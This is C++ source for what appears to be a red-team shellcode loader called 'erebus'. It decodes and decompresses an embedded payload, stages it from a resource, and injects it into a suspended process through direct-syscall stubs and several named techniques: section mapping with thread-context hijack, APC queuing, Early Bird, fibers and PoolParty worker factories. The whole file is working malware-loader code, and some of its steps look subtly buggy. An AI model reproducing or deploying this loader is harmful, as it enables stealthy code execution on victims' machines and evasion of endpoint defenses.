#include "../include/loader.hpp"

namespace erebus {
	Config config{};

	VOID DecompressionLZNT(_Inout_ BYTE* Input, IN SIZE_T InputLen)
	{
		SIZE_T OutputLen = InputLen * 2;
		BYTE* Output = new BYTE[OutputLen];
		ULONG FinalOutputSize;

		ImportModule(ntdll);
		ImportFunction(ntdll, typeRtlDecompressBuffer, _RtlDecompressBuffer);

		NTSTATUS status = _RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, Output, OutputLen, Input, InputLen, &FinalOutputSize);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("RtlDecompressBuffer failed 0x%08X", status);
			delete[] Output;
			return;
		}

		RtlCopyMemory(Input, Output, FinalOutputSize);
		delete[] Output;
		return;
	}

	VOID DecompressionRLE(_Inout_ BYTE* Input, IN SIZE_T InputLen, OUT SIZE_T* OutputLen)
	{
		SIZE_T OutputCapacity = InputLen * 4;
		BYTE* Output = new BYTE[OutputCapacity];
		SIZE_T OutputIndex = 0;

		for (SIZE_T i = 0; i < InputLen && OutputIndex < OutputCapacity; i++)
		{
			BYTE byte = Input[i];

			// Check if this is a run byte (0xFF indicates a run)
			if (byte == 0xFF && i + 1 < InputLen)
			{
				i++;
				BYTE count = Input[i];
				if (i + 1 < InputLen)
				{
					i++;
					BYTE value = Input[i];
					for (int j = 0; j < count && OutputIndex < OutputCapacity; j++)
					{
						Output[OutputIndex++] = value;
					}
				}
			}
			else
			{
				Output[OutputIndex++] = byte;
			}
		}

		RtlCopyMemory(Input, Output, OutputIndex);
		*OutputLen = OutputIndex;
		delete[] Output;
		return;
	}

	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	BYTE DecodeBASE64Char(CHAR c)
	{
		if (c >= 'A' && c <= 'Z') return c - 'A';
		if (c >= 'a' && c <= 'z') return c - 'a' + 26;
		if (c >= '0' && c <= '9') return c - '0' + 52;
		if (c == '+') return 62;
		if (c == '/') return 63;
		return 0;
	}

	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;
		SIZE_T PaddingCount = 0;

		if (Input[InputLen - 1] == '=') PaddingCount++;
		if (Input[InputLen - 2] == '=') PaddingCount++;

		for (SIZE_T i = 0; i < InputLen; i += 4)
		{
			BYTE b1 = DecodeBASE64Char(Input[i]);
			BYTE b2 = DecodeBASE64Char(Input[i + 1]);
			BYTE b3 = (i + 2 < InputLen && Input[i + 2] != '=') ? DecodeBASE64Char(Input[i + 2]) : 0;
			BYTE b4 = (i + 3 < InputLen && Input[i + 3] != '=') ? DecodeBASE64Char(Input[i + 3]) : 0;

			DecodedData[DecodedLen++] = (b1 << 2) | (b2 >> 4);

			if (i + 2 < InputLen && Input[i + 2] != '=')
				DecodedData[DecodedLen++] = ((b2 & 0x0F) << 4) | (b3 >> 2);

			if (i + 3 < InputLen && Input[i + 3] != '=')
				DecodedData[DecodedLen++] = ((b3 & 0x03) << 6) | b4;
		}

		DecodedLen -= PaddingCount;
		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		SIZE_T OutputCapacity = (InputLen / 5) * 4 + 4;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		for (SIZE_T i = 0; i < InputLen; i += 5)
		{
			if (i + 4 >= InputLen) break;

			DWORD value = 0;
			for (int j = 0; j < 5; j++)
			{
				CHAR c = Input[i + j];
				if (c < 33 || c > 117)
					continue;
				value = value * 85 + (c - 33);
			}

			DecodedData[DecodedLen++] = (BYTE)((value >> 24) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)((value >> 16) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)((value >> 8) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)(value & 0xFF);
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeALPHA32(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
		SIZE_T OutputCapacity = InputLen;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		for (SIZE_T i = 0; i < InputLen; i++)
		{
			for (int j = 0; j < 64; j++)
			{
				if (Input[i] == Alpha32Alphabet[j])
				{
					DecodedData[DecodedLen++] = (BYTE)j;
					break;
				}
			}
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeWORDS256(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		// WORDS256 encoding uses a 256-word dictionary - each word is replaced with its index
		// This is a placeholder implementation; adjust based on your specific word dictionary
		SIZE_T OutputCapacity = InputLen * 2;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		const CHAR* WordDelimiters = " \t\n\r";
		SIZE_T i = 0;

		while (i < InputLen && DecodedLen < OutputCapacity)
		{
			// Skip delimiters
			while (i < InputLen && strchr(WordDelimiters, Input[i]))
				i++;

			if (i >= InputLen) break;

			// Extract word index
			SIZE_T WordStart = i;
			while (i < InputLen && !strchr(WordDelimiters, Input[i]))
				i++;

			SIZE_T WordLen = i - WordStart;
			DWORD WordIndex = 0;

			// Convert word to index (assumes numeric word index)
			for (SIZE_T j = 0; j < WordLen && j < 3; j++)
			{
				WordIndex = WordIndex * 10 + (Input[WordStart + j] - '0');
			}

			if (WordIndex <= 255)
			{
				DecodedData[DecodedLen++] = (BYTE)WordIndex;
			}
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	// ============================================================
	// AUTO-DETECTION METHODS
	// ============================================================

	enum CompressionFormat {
		FORMAT_NONE = 0,
		FORMAT_LZNT1 = 1,
		FORMAT_RLE = 2,
		FORMAT_BASE64 = 3,
		FORMAT_ASCII85 = 4,
		FORMAT_ALPHA32 = 5,
		FORMAT_WORDS256 = 6
	};

	CompressionFormat DetectCompressionFormat(_In_ const BYTE* Input, IN SIZE_T InputLen)
	{
		if (!Input || InputLen < 2)
			return FORMAT_NONE;

		// Check for LZNT1 compression signature
		if (InputLen >= 4 && (Input[0] & 0x80) != 0)
		{
			LOG_INFO("Detected LZNT1 compression");
			return FORMAT_LZNT1;
		}

		// Check for RLE (Run-Length Encoding) - look for 0xFF markers
		if (InputLen >= 3)
		{
			int RleMarkerCount = 0;
			for (SIZE_T i = 0; i < min(InputLen - 2, 100); i++)
			{
				if (Input[i] == 0xFF && i + 2 < InputLen)
				{
					RleMarkerCount++;
				}
			}
			if (RleMarkerCount > 0)
			{
				LOG_INFO("Detected RLE compression (%d markers found)", RleMarkerCount);
				return FORMAT_RLE;
			}
		}

		LOG_INFO("No compression detected");
		return FORMAT_NONE;
	}

	BOOL IsValidBase64Char(CHAR c)
	{
		return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || 
		       (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' ||
		       c == ' ' || c == '\t' || c == '\n' || c == '\r';
	}

	BOOL IsValidASCII85Char(CHAR c)
	{
		return (c >= 33 && c <= 117) || c == '!' || c == ' ' || c == '\t' || c == '\n' || c == '\r';
	}

	BOOL IsValidALPHA32Char(CHAR c)
	{
		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
		return strchr(Alpha32Alphabet, c) != NULL;
	}

	BOOL IsValidWORDS256Format(_In_ const CHAR* Input, IN SIZE_T InputLen)
	{
		// Check if input is space-separated numbers 0-255
		SIZE_T i = 0;
		int WordCount = 0;

		while (i < InputLen && WordCount < 100)
		{
			// Skip delimiters
			while (i < InputLen && (Input[i] == ' ' || Input[i] == '\t' || Input[i] == '\n' || Input[i] == '\r'))
				i++;

			if (i >= InputLen) break;

			// Check if word contains only digits
			SIZE_T WordStart = i;
			while (i < InputLen && Input[i] >= '0' && Input[i] <= '9')
				i++;

			SIZE_T WordLen = i - WordStart;
			if (WordLen == 0 || WordLen > 3)
				return FALSE;

			WordCount++;
		}

		return WordCount > 0;
	}

	CompressionFormat DetectEncodingFormat(_In_ const CHAR* Input, IN SIZE_T InputLen)
	{
		if (!Input || InputLen < 4)
			return FORMAT_NONE;

		// Check for Base64
		int Base64ValidCount = 0;
		for (SIZE_T i = 0; i < InputLen; i++)
		{
			if (IsValidBase64Char(Input[i]))
				Base64ValidCount++;
		}
		if (Base64ValidCount > (InputLen * 0.9))
		{
			LOG_INFO("Detected Base64 encoding");
			return FORMAT_BASE64;
		}

		// Check for ASCII85
		int ASCII85ValidCount = 0;
		for (SIZE_T i = 0; i < InputLen; i++)
		{
			if (IsValidASCII85Char(Input[i]))
				ASCII85ValidCount++;
		}
		if (ASCII85ValidCount > (InputLen * 0.8))
		{
			LOG_INFO("Detected ASCII85 encoding");
			return FORMAT_ASCII85;
		}

		// Check for ALPHA32
		BOOL IsAlpha32 = TRUE;
		for (SIZE_T i = 0; i < InputLen; i++)
		{
			if (!IsValidALPHA32Char(Input[i]))
			{
				IsAlpha32 = FALSE;
				break;
			}
		}
		if (IsAlpha32)
		{
			LOG_INFO("Detected ALPHA32 encoding");
			return FORMAT_ALPHA32;
		}

		// Check for WORDS256
		if (IsValidWORDS256Format(Input, InputLen))
		{
			LOG_INFO("Detected WORDS256 encoding");
			return FORMAT_WORDS256;
		}

		LOG_INFO("No encoding detected");
		return FORMAT_NONE;
	}

	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
	{
		LOG_INFO("Analyzing shellcode format...");

		CompressionFormat format = DetectCompressionFormat(*Shellcode, *ShellcodeLen);
		
		switch (format)
		{
			case FORMAT_LZNT1:
			{
				LOG_SUCCESS("Decompressing with LZNT1");
				DecompressionLZNT(*Shellcode, *ShellcodeLen);
				break;
			}
			case FORMAT_RLE:
			{
				LOG_SUCCESS("Decompressing with RLE");
				SIZE_T NewLen = 0;
				DecompressionRLE(*Shellcode, *ShellcodeLen, &NewLen);
				*ShellcodeLen = NewLen;
				break;
			}
			default:
				LOG_INFO("No binary compression detected, skipping decompression");
				break;
		}
	}

	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		LOG_INFO("Analyzing encoding format...");

		CompressionFormat format = DetectEncodingFormat(Input, InputLen);

		switch (format)
		{
			case FORMAT_BASE64:
			{
				LOG_SUCCESS("Decoding Base64");
				DecodeBase64(Input, InputLen, Output, OutputLen);
				break;
			}
			case FORMAT_ASCII85:
			{
				LOG_SUCCESS("Decoding ASCII85");
				DecodeASCII85(Input, InputLen, Output, OutputLen);
				break;
			}
			case FORMAT_ALPHA32:
			{
				LOG_SUCCESS("Decoding ALPHA32");
				DecodeALPHA32(Input, InputLen, Output, OutputLen);
				break;
			}
			case FORMAT_WORDS256:
			{
				LOG_SUCCESS("Decoding WORDS256");
				DecodeWORDS256(Input, InputLen, Output, OutputLen);
				break;
			}
			default:
			{
				LOG_INFO("No encoding detected, returning raw input");
				*Output = new BYTE[InputLen];
				RtlCopyMemory(*Output, Input, InputLen);
				*OutputLen = InputLen;
				break;
			}
		}
	}

	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		shellcode_address = HeapAlloc(GetProcessHeap(), 0, resource_size);
		if (shellcode_address)
		{
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
			success = TRUE;
		}

		*shellcode_size = (SIZE_T)resource_size;
		*shellcode = (BYTE*)shellcode_address;
		return success;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		if (!NT_SUCCESS(Sw3NtAllocateVirtualMemory(process_handle, &base_address, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
		{
			LOG_ERROR("Failed to allocate memory space.");
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: 0x%08pX", base_address);

		if (!NT_SUCCESS(Sw3NtWriteVirtualMemory(process_handle, base_address, shellcode, shellcode_size, &bytes_written)))
		{
			LOG_ERROR("Error writing shellcode to memory.");
			return NULL;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!NT_SUCCESS(Sw3NtProtectVirtualMemory(process_handle, &base_address, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
		{
			LOG_ERROR("Failed to change protection type.");
			return NULL;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return base_address;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		SIZE_T lpSize = 0;
		const DWORD attribute_count = 1;

		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};

		BOOL success = CreateProcessW(
			NULL,
			cmd,
			NULL,
			NULL,
			FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL,
			NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;

		return success;
	}

	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via. NtUnmapViewOfSection");

		HANDLE section_handle;
		LARGE_INTEGER section_size = { shellcode_size };

		NTSTATUS status = Sw3NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		PVOID local_address = NULL;

		status = Sw3NtMapViewOfSection(
			section_handle,
			process_handle,
			&local_address,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READ
		);

		RtlCopyMemory(local_address, &shellcode, shellcode_size);

		PVOID remote_address = NULL;

		status = Sw3NtMapViewOfSection(
			section_handle,
			process_handle,
			&remote_address,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READ);

		LPCONTEXT context_ptr = new CONTEXT();
		context_ptr->ContextFlags = CONTEXT_INTEGER;
		GetThreadContext(thread_handle, context_ptr);

		context_ptr->Rcx = (DWORD64)remote_address;
		SetThreadContext(thread_handle, context_ptr);

		ResumeThread(thread_handle);

		status = Sw3NtUnmapViewOfSection(
			process_handle,
			local_address
		);

		Sw3NtClose(process_handle);
		Sw3NtClose(thread_handle);

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		Sw3NtResumeThread(hThread, NULL);

		Sw3NtFreeVirtualMemory(hThread, &base_address, &shellcode_size, MEM_RELEASE);

		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. CreateFiber");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Convert current thread to fiber
		LPVOID main_fiber = ConvertThreadToFiber(NULL);
		if (main_fiber == NULL) {
			LOG_ERROR("Failed to convert thread to fiber (Code: 0x%08lX)", GetLastError());
			return;
		}

		LOG_SUCCESS("Converted thread to fiber");

		// Create a new fiber pointing to shellcode
		LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_address, NULL);
		if (shellcode_fiber == NULL) {
			LOG_ERROR("Failed to create fiber (Code: 0x%08lX)", GetLastError());
			return;
		}

		LOG_SUCCESS("Created shellcode fiber at: 0x%08pX", shellcode_fiber);

		// Switch to shellcode fiber
		LOG_INFO("Switching to shellcode fiber...");
		SwitchToFiber(shellcode_fiber);

		// Cleanup (won't reach here if shellcode doesn't return)
		DeleteFiber(shellcode_fiber);

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. EarlyCascade (Early Bird APC)");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Queue APC to suspended thread (Early Bird technique)
		NTSTATUS status = Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("APC queued to suspended thread");

		// Resume thread to execute APC
		status = Sw3NtResumeThread(hThread, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Thread resumed, shellcode executing before process initialization");

		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. PoolParty (Worker Factory)");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Create IO Completion Port
		HANDLE hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
		if (hPort == NULL) {
			LOG_ERROR("Failed to create IO completion port (Code: 0x%08lX)", GetLastError());
			return;
		}

		LOG_SUCCESS("IO Completion Port created");

		// Prepare object attributes for worker factory
		OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
		HANDLE hWorkerFactory = NULL;

		// NtCreateWorkerFactory parameters
		typedef NTSTATUS(NTAPI* typeNtCreateWorkerFactory)(
			PHANDLE WorkerFactoryHandle,
			ACCESS_MASK DesiredAccess,
			POBJECT_ATTRIBUTES ObjectAttributes,
			HANDLE CompletionPortHandle,
			HANDLE WorkerProcessHandle,
			PVOID StartRoutine,
			PVOID StartParameter,
			ULONG MaxThreadCount,
			SIZE_T StackReserve,
			SIZE_T StackCommit
			);

		ImportModule(ntdll);
		ImportFunction(ntdll, typeNtCreateWorkerFactory, NtCreateWorkerFactory);

		if (NtCreateWorkerFactory == NULL) {
			LOG_ERROR("Failed to resolve NtCreateWorkerFactory");
			CloseHandle(hPort);
			return;
		}

		NTSTATUS status = NtCreateWorkerFactory(
			&hWorkerFactory,
			WORKER_FACTORY_ALL_ACCESS,
			&oa,
			hPort,
			hProcess,
			base_address,  // Start routine points to shellcode
			NULL,
			1,
			0,
			0
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to create worker factory (NTSTATUS: 0x%08X)", status);
			CloseHandle(hPort);
			return;
		}

		LOG_SUCCESS("Worker Factory created");

		// Trigger worker thread creation
		typedef NTSTATUS(NTAPI* typeNtSetInformationWorkerFactory)(
			HANDLE WorkerFactoryHandle,
			ULONG WorkerFactoryInformationClass,
			PVOID WorkerFactoryInformation,
			ULONG WorkerFactoryInformationLength
			);

		ImportFunction(ntdll, typeNtSetInformationWorkerFactory, NtSetInformationWorkerFactory);

		if (NtSetInformationWorkerFactory) {
			status = NtSetInformationWorkerFactory(hWorkerFactory, 1, &base_address, sizeof(PVOID));
			if (!NT_SUCCESS(status)) {
				LOG_ERROR("Failed to set worker factory information (NTSTATUS: 0x%08X)", status);
			}
			else {
				LOG_SUCCESS("Worker factory triggered");
			}
		}

		// Cleanup
		CloseHandle(hWorkerFactory);
		CloseHandle(hPort);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
} // End of erebus namespace
